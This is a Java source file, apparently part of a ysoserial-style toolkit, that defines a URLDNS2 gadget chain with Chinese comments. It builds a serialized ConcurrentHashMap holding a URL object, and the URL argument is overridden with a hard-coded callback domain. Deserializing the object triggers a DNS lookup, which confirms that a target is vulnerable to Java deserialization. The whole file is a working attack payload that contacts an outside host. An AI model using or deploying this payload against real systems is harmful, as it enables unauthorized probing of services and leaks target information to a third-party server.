package Node.payload;

import Node.node.ConcurrentHashMap_node;
import Node.node.HashMap_node;
import Node.node.URLStreamHandler_node;
import Node.node.Url_node;
import Node.utils.PayloadRunner;
import Node.utils.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

public class URLDNS2 implements ObjectPayload<Object>{
    public Object getObject(String url) throws Exception {
        url="http://ksek3.leiaffectionli.xyz";
        //URLStreamHandler_node 节点1
        URLStreamHandler handler=URLStreamHandler_node.return_node();

        //URL 节点2
        URL url1= Url_node.return_node(url,handler);

        //ConcurrentHashMap_node 最后节点
        ConcurrentHashMap concurrentHashMap= ConcurrentHashMap_node.return_node();
        concurrentHashMap.put(url1,url);

        //节点2 触发调整
        Url_node.return_hashcode(url1);

        return concurrentHashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(URLDNS2.class, args);
    }


}
